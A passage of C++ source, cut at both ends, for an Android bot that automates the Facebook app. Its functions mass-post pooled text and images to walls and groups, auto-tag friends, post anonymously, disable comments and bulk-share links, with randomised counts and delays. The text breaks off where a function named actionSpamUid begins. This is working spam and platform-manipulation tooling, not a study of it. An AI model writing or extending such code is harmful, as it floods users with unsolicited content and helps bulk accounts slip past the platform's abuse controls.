                    "//*[@content-desc ='Make a post on Facebook']",
                    "//*[@text='Create post']",
                    "//*[@text='Post audience']",
                    "//*[@content-desc='Allow access to your camera roll']",
                    "//*[@text='Post to']",
            });

            if (element == "//*[@content-desc=\"What's on your mind? Make a post on Facebook\"" ||
                element == "//*[@content-desc ='Make a post on Facebook']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@text='Create post']") {
                if (!existNode("//*[@content-desc='Choose privacy Public']", xml) &&
                    existNode("//*[contains(@content-desc,'Choose privacy')]", xml) &&
                    !isPrivacyChanged) {
                    tap("//*[contains(@content-desc,'Choose privacy')]", xml);
                    delay(2);
                    isPrivacyChanged = true;
                    continue;
                }

                if (ckbDangLink) {
                    AddLink(textLink,
                            "Up wall " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                            ", ");
                }
                auto [success, content, itemId] = getScriptContent(postContentId);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return NOMAP; // chay tiep hoac dung lai
                }
                if (ckbXoaLink) {
                    inputText("//android.widget.EditText", content);
                } else {
                    inputText("//android.widget.EditText", content, false);
                }
                // comment, dang bai, .....
                // xoa content sau khi su dung
                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }

                delay(1);

                if (ckbUseBackground) {
                    AddBackgroupPost(
                            "Up wall " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                            ", ");
                } else {
                    if (tap("//*[@content-desc='No background']"))
                        delay(2);
                }

                if (ckbAnh) {
                    AddImagePost(galleryId, Common::ranNumber(nudSoLuongAnhFrom, nudSoLuongAnhTo),
                                 "Up wall " + to_string(countSuccess + 1) + "/" +
                                 to_string(soLuong) + ", ");
                }

                if (ckbTagFriends) {
                    TagFriendsPost(Common::ranNumber(nudSoLuongTagFrom, nudSoLuongTagTo),
                                   "Up wall " + to_string(countSuccess + 1) + "/" +
                                   to_string(soLuong) + ", ");
                }

                updateLine("Up wall " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                           " tap post");
                xml = dumpXml();
                if (tapCenter("//*[@content-desc='NEXT']", xml)) {
                    delay(2);
                    xml = dumpXml();
                }
                if (existNode("//*[@text='Post to']", xml, 0)) {
                    tapCenter("//*[@content-desc='Share']");
                    delay(2);
                }
                tapCenter("//*[@content-desc='POST']", xml);
                delay(2);

                //*[@content-desc='Row showing that your post is being uploaded']
                waitNodeHide("//*[@text='Posting…' or @content-desc='Posting…']", 60);

                delay(nudDelayFrom, nudDelayTo,
                      "Up wall " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine("Up wall " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

                timeStart = high_resolution_clock::now();
                continue;
            }
            if (element == "//*[@text='Post audience']") {
                tap("//android.widget.ListView/child::*[1]", xml);
                delay(2);
                tap("//*[@text='Set as default audience.' and @checked='false']");
                delay(1);
                tap("//*[@text='Done' or @text='Save']");
                delay(2);
                continue;
            }
            if (!isAppOpened("com.facebook.katana"))
                openApp("com.facebook.katana");
        }
        return NOMAP;
    }

    bool AddBackgroupPost(string status = "") {
        updateLine(status + "add background");
        string xml = dumpXml();
        if (existNode("//*[@content-desc='Show background options']", xml)) {
            tapCenter("//*[@content-desc='Show background options']", xml);
            delay(2);
            xml = dumpXml();
        }

        int countNode = getNodes("//*[contains(@content-desc,', background')]", xml).size();
        if (countNode > 0) {
            int indexNode = Common::ranNumber(1, countNode - 1);
            if (indexNode == 0)
                indexNode = 1;
            tap("(//*[contains(@content-desc,', background')])[" + to_string(indexNode) + "]", xml);
            delay(2);
            return true;
        }
        return false;
    }

    bool AddImagePost(string image, int countImage, string status = "") {
        vector<MediaS3> lstMedia = getScriptMedia(image, countImage);

        if (lstMedia.empty())
            return false;

        updateLine(status + "Add image...");

        //input
        int countSuccess = 0;

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Photo/video']",
                    "//*[@content-desc='Allow access']",
                    "//*[@text=\"Allow Facebook to use your phone's storage?\"]",
                    "//*[contains(@text,'Allow Facebook to access photo')]",
                    "//*[@content-desc='Allow access to your camera roll']",
//                    "//*[@content-desc='Photo' or @content-desc='Video']/*[@content-desc='Photo' or @content-desc='Video']",
                    "//*[@content-desc='Photo' or @content-desc='Video' or contains(@content-desc,'Photo') or contains(@content-desc,'Video')]/*[@content-desc='Photo' or @content-desc='Video' or contains(@content-desc,'Photo') or contains(@content-desc,'Video')]",
            });
            if (element == "//*[@content-desc='Photo/video']") {
                if (existNode("//*[@content-desc='Close layout options']", xml)) {
                    tapCenter("//*[@content-desc='Close layout options']", xml);
                    delay(2);
                    continue;
                }
                if (countSuccess > 0)
                    break;
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@text=\"Allow Facebook to use your phone's storage?\"]" ||
                element == "//*[contains(@text,'Allow Facebook to access photo')]") {
                tapCenter("//*[@text='ALLOW']", xml);
                delay(2);
                continue;
            }
            if (element ==
                "//*[@content-desc='Photo' or @content-desc='Video' or contains(@content-desc,'Photo') or contains(@content-desc,'Video')]/*[@content-desc='Photo' or @content-desc='Video' or contains(@content-desc,'Photo') or contains(@content-desc,'Video')]") {
                if (countImage == 1) {
                    tap(element, xml);
                    delay(2);
                    countSuccess++;
                    continue;
                }

                if (existNode("//*[@content-desc='Select multiple']", xml) &&
                    !existNode("//*[@content-desc='Select multiple' and @selected='true']", xml)) {
                    tap("//*[@content-desc='Select multiple']", xml);
                    delay(2);
                    continue;
                }

                auto lstNodes = getNodes(
                        "//*[@content-desc='Photo' or @content-desc='Video' or contains(@content-desc,'Photo') or contains(@content-desc,'Video')]/*[@content-desc='Photo' or @content-desc='Video' or contains(@content-desc,'Photo') or contains(@content-desc,'Video')][@selected='false']",
                        xml);
                if (!lstNodes.empty()) {
                    for (const Node &node: lstNodes) {
                        updateLine(status + "Add image (" + to_string(countSuccess + 1) + "/" +
                                   to_string(countImage) + ")");
                        tap(node);
                        delay(2);
                        countSuccess++;
                        if (countSuccess >= countImage) {
                            tap("//*[@content-desc='NEXT']");
                            break;
                        }
                    }
                    delay(2);
                    timeStart = high_resolution_clock::now();
                    continue;
                }

                if (swipeAndScreenNotChange())
                    break;
            }
        }

        if(countSuccess > 0){
//            if (ckbXoaAnhDaDung) {
//                deleteScriptMedia(lstMedia);
//            }
        }

        return countSuccess > 0;
    }

    bool TagFriendsPost(int countTag, string status = "") {
        updateLine(status + "Tag friends");

        //input
        int countSuccess = 0;

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@content-desc='Tag people']",
                    "//android.widget.CompoundButton[@checked='false']",
                    "//*[@content-desc='No people to show']",
            });

            if (element == "//android.widget.Button[@content-desc='Tag people']") {
                if (countSuccess > 0)
                    break;
                tap(element, xml);
                delay(2);
                continue;
            }
            if (screen == "FB_FRIEND_SUGGEST") {
                if (countSuccess == 0) {
                    tap("//android.widget.CompoundButton[@checked='false']", xml);
                    delay(2);
                    countSuccess++;
                    continue;
                }

                auto lstNodes = getNodes("//android.widget.CompoundButton[@checked='false']", xml);
                for (const Node &node: lstNodes) {
                    updateLine(status + "Tag friends " + to_string(countSuccess + 1) + "/" +
                               to_string(countTag));
                    tap(node);
                    delay(1);

                    countSuccess++;
                    if (countSuccess >= countTag) {
                        back();
                        break;
                    }
                }
                delay(2);
                timeStart = high_resolution_clock::now();
                continue;
            }
            if (!existNode("//android.widget.CompoundButton[@checked='false']", xml))
                back();

            if (element == "//*[@content-desc='No people to show']") {
                tap("//*[@content-desc='Back']");
                delay(2);
            }

            if (swipeAndScreenNotChange())
                break;
        }

        return countSuccess > 0;
    }

    bool AddLink(string link, string status = "") {
        updateLine(status + "add link");

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.EditText[@text=\"What's on your mind?\"]",
            });
            if (element == "//android.widget.EditText[@text=\"What's on your mind?\"]") {
                inputText(element, link);
                delay(1);
                waitNode("//*[@content-desc='Remove']", xml, 15);
                return true;
            }
        }
        return false;
    }

    ResultScreen actionUpGroup() {
        string currentVersion = getPackageVersion(social.package);
        //goto
        if (currentVersion == "488.0.0.78.79") {
            if (!gotoGroup())
                return NOMAP;
            delay(2);
        } else if (currentVersion == "428.0.0.26.108") {
            if (!handleSetUpGroup())
                return NOMAP;
            delay(2);
        }
        //input người dùng nhập
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");

        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");

        int cbbDoiTuong = action.getInt("cbbDoiTuong");
        vector<string> txtUid = action.getList("txtId");

        //input thêm biến xử lý
        int countSuccess = 0;
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        bool typeUpGroup;
        int countIndex = 1;
        updateLine("Post group : " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;
            if (isStopped()) break;

            if (cbbDoiTuong == 0) {
                updateLine("Post group joined...");
                typeUpGroup = handleUpGroupJoined(countIndex);
            } else {
                if (txtUid.empty()) break;
                updateLine("Post group UID :" + to_string(txtUid.size()) + " groups");
                string uid = Common::ranItem(txtUid);
                Common::removeItem(txtUid, uid);
                typeUpGroup = handleUpGroupUid(uid);
            }
//            if (cbbDoiTuong == 1) {
//                if (txtUid.empty()) break;
//                updateLine(to_string(txtUid.size()));
//                string uid = Common::ranItem(txtUid);
//                Common::removeItem(txtUid, uid);
//                typeUpGroup = handleUpGroupUid(uid);
//            }
            if (typeUpGroup) {
                countSuccess++;
                countIndex++;
                delay(nudDelayFrom, nudDelayTo,
                      "Post group : " + to_string(countSuccess) + "/" + to_string(soLuong) +
                      " success, delay");
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine(
                        "Post group : " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                timeStart = high_resolution_clock::now();
                continue;
            }
        }
        return NOMAP;
    }

    //Handle setup to upgroup
    bool handleSetUpGroup() {
        //input người dùng nhập

        //input thêm biến xử lý nếu cần thiết

        //goto
        if (!gotoGroup())
            return false;
        delay(2);

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;
            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@content-desc='Create actions entry point']",
                    "//android.widget.Button[@content-desc=\"Create a post, Post in a group you've joined.\"]",
                    "//*[@text='Choose Group Heading' or @content-desc='Choose Group Heading']"
            });

            if (element == "//android.widget.Button[@content-desc='Create actions entry point']"
                || element ==
                   "//android.widget.Button[@content-desc=\"Create a post, Post in a group you've joined.\"]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//*[@text='Choose Group Heading' or @content-desc='Choose Group Heading']") {
                back();
                return true;
            }
        }
        return false;
    }

    //Handle Create Post Group
    bool handleCreatePostGroup() {
        //input người dùng
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");

        bool ckbVanBan = action.getBool("ckbVanBan");
        string postContentId = action.getString("postContentId");

        bool ckbUseBackground = action.getBool("ckbUseBackground");

        bool ckbAnh = action.getBool("ckbAnh");
        string galleryId = action.getString("galleryId");
        int nudSoLuongAnhFrom = action.getInt("nudSoLuongAnhFrom");
        int nudSoLuongAnhTo = action.getInt("nudSoLuongAnhTo");

        bool ckbckbDangBaiAnDanh = action.getBool("ckbDangBaiAnDanh");
        bool ckbTatComment = action.getBool("ckbTatComment");
        //input các biến cần thiết để xử lý
        if (ckbUseBackground && ckbAnh)
            ckbUseBackground = false;
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;
        int countIndex = 1;
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //goto

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                return false;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                return false;

            string element = existNodes(3, xml, {
                    "//*[@content-desc='Write something...' or @text='Write something...']",
                    "//*[@content-desc='Post anonymously...' or @text='Post anonymously...']",
                    "//android.widget.Switch[@content-desc='Post anonymously' and @checked='false']",

            });
            if (element == "//*[@content-desc='Write something...' or @text='Write something...']"
                || element ==
                   "//*[@content-desc='Post anonymously...' or @text='Post anonymously...']") {
                tapCenter(element, xml);
                delay(2);
                continue;
            }

            if (ckbckbDangBaiAnDanh) {
                updateLine("Post anonymously...");
                if (element ==
                    "//android.widget.Switch[@content-desc='Post anonymously' and @checked='false']") {
                    tap(element, xml);
                    delay(2);
                    tap("//*[@content-desc='Got it']");
                    delay(2);
                    continue;
                }
            }

            string noiDung;
            if (ckbVanBan) {
                auto [success, content, itemId] = getScriptContent(postContentId);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return NOMAP; // chay tiep hoac dung lai
                }

                // comment, dang bai, .....
                // Common::NLog("Content: " + content, "handleTest");

                inputText("//android.widget.EditText", content);
                // xoa content sau khi su dung

                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }
                delay(1);
            }


            if (ckbUseBackground) {
                AddBackgroupPost("Add background...");
            } else {
                if (tap("//*[@content-desc='No background']"))
                    delay(2);
            }

            if (ckbAnh) {
                AddImagePost(galleryId, Common::ranNumber(nudSoLuongAnhFrom, nudSoLuongAnhTo));
            }
//            updateLine("Post group " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
//                       " tap post");
            xml = dumpXml();
            tapCenter("//*[@content-desc='POST']", xml);
            delay(2);
            waitNodeHide(
                    "//*[@text='Posting…' or @content-desc='Posting…' or @class='android.widget.ProgressBar' or @content-desc='More']",
                    60);
            if (ckbTatComment) {
                if (existNode("//*[@content-desc='More']", xml)) {
                    tapCenter("//*[@content-desc='More']", xml);
                    delay(2);
                    tapCenter("//*[@content-desc='Turn off commenting ']", xml);
                    delay(2);
                }
            }
            return true;
        }
        return false;
    }

    bool backElement(string element) {
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;
            if (existNode(element, xml))
                return true;

            string elements = existNodes(0, xml, {
                    element,
                    "//*[@content-desc='Back']",
                    "//android.widget.Button[@text='Discard']",

            });
            if (elements == element)
                return true;
            if (elements ==
                "//*[@content-desc='Back']") {
                tapCenter(elements, xml);
                delay(2);
                continue;
            }
            if (elements == "//android.widget.Button[@text='Discard']") {
                tapCenter(elements, xml);
                delay(2);
                continue;
            }


            back(1, 1);
            delay(2);

        }
        return false;
    }

    bool GotoYourGroup() {
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Your groups' or @text='Your groups']",
            });

            if (element == "//*[@content-desc='Your groups' or @text='Your groups']") {
                tapCenter(element, xml);
                delay(2);
                return true;
            }
        }
        return false;
    }

    //Handle upgroup joined
    bool handleUpGroupJoined(int index) {
        //input biến xử lý

        //goto
        if (!GotoYourGroup())
            return false;
        delay(2);

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            if (existNode("//*[@text='Group rules']", xml)) {
                back();
                delay(2);
                continue;
            }

            string element = existNodes(3, xml, {
                    "//*[@content-desc='Write something...' or @text='Write something...']",
                    "//*[@content-desc='Post anonymously...' or @text='Post anonymously...']",
                    "(//androidx.recyclerview.widget.RecyclerView/android.view.ViewGroup[@content-desc and string-length(@content-desc) > 0 and @clickable='true'])[" +
                    to_string(index) + "]",
                    "(//androidx.recyclerview.widget.RecyclerView/android.widget.Button/android.widget.ImageView)[" +
                    to_string(index) + "]",


            });
            xml = dumpXml();
            if (element == "//*[@content-desc='Write something...' or @text='Write something...']"
                || element ==
                   "//*[@content-desc='Post anonymously...' or @text='Post anonymously...']") {
                handleCreatePostGroup();
                delay(2);
                backElement("//*[@content-desc='Your groups' or @text='Your groups']");
                return true;
            }

            if (element ==
                "(//androidx.recyclerview.widget.RecyclerView/android.view.ViewGroup[@content-desc and string-length(@content-desc) > 0 and @clickable='true'])[" +
                to_string(index) + "]"
                || element ==
                   "(//androidx.recyclerview.widget.RecyclerView/android.widget.Button/android.widget.ImageView)[" +
                   to_string(index) + "]") {
                tapCenter(element, xml);
                waitNode("//*[@content-desc='Write something...' or @text='Write something...']",
                         xml, 15);
                continue;
            }
            if (swipeAndScreenNotChange())
                return NOMAP;
        }
        return false;
    }

    //Handle up group by UID
    bool handleUpGroupUid(string uid) {
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //goto
        if (!gotoGroup(uid))
            return false;
        delay(2);

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@content-desc=\"This content isn't available\" or @text=\"This content isn't available\"]",
                    "//*[@content-desc='Write something...' or @text='Write something...']",
            });
            if (element ==
                "//*[@content-desc=\"This content isn't available\" or @text=\"This content isn't available\"]") {
                tapCenter("//*[@content-desc='Back']", xml);
                delay(2);
                continue;
            }

            if (element ==
                "//*[@content-desc='Write something...' or @text='Write something...']") {
                handleCreatePostGroup();
                delay(2);
                return true;
            }
            return false;
        }
        return false;
    }


    ResultScreen actionSharePostUid() {
        Base::updateLine("Sharing post...");
        //input người dùng nhập
        vector<string> txtLinkChiaSe = action.getList("txtLink");
        int typeLinkShare = action.getInt("typeLink");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayFrom");

        //input biến khác nếu cần thiết
        int countSuccess = 0;
        int soLuong = txtLinkChiaSe.size();
        //goto

        updateLine("Share post " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        //loop
        while (true) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            if (isStopped()) break;

            if (txtLinkChiaSe.empty()) break;

            string xml = dumpXml();

            string screen = handleScreen(xml);

            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            bool isValid = false;

            string uid = txtLinkChiaSe.front();
            switch (typeLinkShare) {
                case 0: // Chỉ chấp nhận video hoặc livestream
                    isValid = Common::strContains(uid, "videos");
                    break;
                case 1: // Chỉ chấp nhận post hoặc reel
                    isValid = Common::strContains(uid, "posts") || Common::strContains(uid, "reel");
                    break;
                default:
                    updateLine("Invalid typeLinkShare: " + to_string(typeLinkShare));
                    return NOMAP;
            }
            if (!isValid) {
                Common::removeItem(txtLinkChiaSe, uid);
                continue;
            }
            Common::removeItem(txtLinkChiaSe, uid);
            if (handleSharePostUid(uid)) {
                delay(nudDelayFrom, nudDelayTo, "Share post " + to_string(countSuccess + 1) + "/" +
                                                to_string(soLuong) + " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine("Share post " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                timeStart = high_resolution_clock::now();
                continue;
            }
        }
        return NOMAP;
    }

    //Handle share post by uid
    bool handleSharePostUid(string uid) {
        //input người dùng
        bool ckbShareBaiLenTuong = action.getBool("ckbShareBaiLenTuong");
        bool ckbShareBaiLenNhom = action.getBool("ckbShareBaiLenNhom");
        bool ckbVanBan = action.getBool("ckbVanBan");
        string shareContentId = action.getString("shareContentId");

        //input biến ngoài nếu cần
        bool isShareWallDone = false;

        //goto
        if (gotoPost(uid) == "false")
            return false;
        delay(2);

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@text='Share' or @content-desc='Share']",
            });

            if (element == "//android.widget.Button[@text='Share' or @content-desc='Share']") {
                if (ckbShareBaiLenTuong) {
                    updateLine("Share to wall...");
                    handleSharePostWall(shareContentId, ckbVanBan);
                    delay(2);
                }
                if (ckbShareBaiLenNhom) {
                    updateLine("Share to group...");
                    handleSharePostGroup(shareContentId, ckbVanBan);
                    delay(2);
                }
                return true;
            }
            if (swipeAndScreenNotChange())
                return false;
        }
        return false;
    }

    //Handle share on wall
    bool handleSharePostWall(string txtNoiDung, bool ckbVanBan) {
        //input người dùng nhập
        int nudCountWallFrom = action.getInt("nudCountWallFrom");
        int nudCountWallTo = action.getInt("nudCountWallTo");

        //input xử lý biến
        int countShareWall = 0;
        int soLuongShareWall = Common::ranNumber(nudCountWallFrom, nudCountWallTo);

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@text='Share' or @content-desc='Share']",
                    "//android.widget.EditText[@text='Say something about this…']",
            });

            if (element == "//android.widget.Button[@text='Share' or @content-desc='Share']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.EditText[@text='Say something about this…']") {
                if (!existNode("//*[@content-desc='Public']", xml, 0) &&
                    tap("//*[@content-desc='Write Post' or @content-desc='Feed' or @content-desc='Facebook']/following-sibling::*[1]",
                        xml)) {
                    delay(2);
                    if (!SetPrivacyPublic()) {
                        back();
                        delay(1);
                    }
                    xml = dumpXml();
                }
                if (ckbVanBan) {
                    auto [success, content, itemId] = getScriptContent(txtNoiDung);

                    if (!success) {
                        saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                        return NOMAP; // chay tiep hoac dung lai
                    }

                    // comment, dang bai, .....
                    inputText("//android.widget.EditText", content);
                    // xoa content sau khi su dung

                    if (!itemId.empty()) {
                        deleteScriptContent(itemId);
                    }
                    delay(1);
                }
                xml = dumpXml();
                tap("//android.widget.Button[@content-desc='Share now']", xml);
                countShareWall++;
                delay(2);
                if (countShareWall >= soLuongShareWall)
                    return true;
                continue;
            }
        }
        return false;
    }

    //Handle share group
    bool handleSharePostGroup(string txtNoiDung, bool ckbVanBan) {
        //input người dùng nhập
        int nudCountGroupFrom = action.getInt("nudCountGroupFrom");
        int nudCountGroupTo = action.getInt("nudCountGroupTo");
        //input xử lý biến
        int countShareGroup = 1;
        int countShareSuccess = 0;
        int soLuongShareGroup = Common::ranNumber(nudCountGroupFrom, nudCountGroupTo);

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            // Thêm kiểm tra nếu không có nhóm
            if (Common::strContains(xml, "No Groups")) {
                updateLine("No groups to share");
                break;
            }

            string element = existNodes(3, xml, {
                    "//android.widget.Button[@text='Share' or @content-desc='Share']",
                    "//android.widget.Button[@content-desc='Share to a group']",
                    "//android.view.ViewGroup[@content-desc='Group']",
                    "//*[@class='android.widget.ListView']/child::*[" + to_string(countShareGroup) +
                    "]",
                    "//android.widget.Button[@content-desc='POST']",
                    "//*[@class='androidx.recyclerview.widget.RecyclerView']/child::*[" +
                    to_string(countShareGroup) + "]",

            });
            updateLine("element" + element);
            if (element == "//android.widget.Button[@text='Share' or @content-desc='Share']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.Button[@content-desc='Share to a group']" ||
                element == "//android.view.ViewGroup[@content-desc='Group']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//*[@class='android.widget.ListView']/child::*[" + to_string(countShareGroup) + "]"
                || element == "//*[@class='androidx.recyclerview.widget.RecyclerView']/child::*[" +
                              to_string(countShareGroup) + "]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.Button[@content-desc='POST']") {
                if (ckbVanBan) {
                    auto [success, content, itemId] = getScriptContent(txtNoiDung);

                    if (!success) {
                        saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                        return NOMAP; // chay tiep hoac dung lai
                    }

                    // comment, dang bai, .....
                    inputText("//android.widget.EditText", content);
                    // xoa content sau khi su dung

                    if (!itemId.empty()) {
                        deleteScriptContent(itemId);
                    }
                    delay(1);
                }
                tap(element, xml);
                delay(2, 3, "Share group " + to_string(countShareSuccess + 1) + "/" +
                            to_string(soLuongShareGroup) + " success, delay");
                countShareGroup++;
                countShareSuccess++;
                if (countShareSuccess >= soLuongShareGroup)
                    return tap("//android.widget.ImageView[@content-desc='Back']", xml);
                continue;
            }
        }
        return false;
    }

    //Handle input text share
    bool handleTextShare(string txtNoiDung) {
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            string xml = dumpXml();
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.EditText[@text='Say something about this…' or @text='Write something…']",
            });
            if (element ==
                "//android.widget.EditText[@text='Say something about this…' or @text='Write something…']") {
                auto [success, content, itemId] = getScriptContent(txtNoiDung);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return NOMAP; // chay tiep hoac dung lai
                }

                // comment, dang bai, .....

                inputText("//android.widget.EditText", content);
                // xoa content sau khi su dung

                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }
                delay(1);
                return true;
            }
        }
        return false;
    }


    ResultScreen actionSpamUid() {
        //input người dùng nhập
        vector<string> txtUid = action.getList("txtUid");
        int typeID = action.getInt("typeID");
        int nudSoLuongUidFrom = action.getInt("nudSoLuongUidFrom");
        int nudSoLuongUidTo = action.getInt("nudSoLuongUidTo");

        //input xử lý thêm nếu cần thiết
        int soLuongUid = Common::ranNumber(nudSoLuongUidFrom, nudSoLuongUidTo);
        int countSuccess = 0;

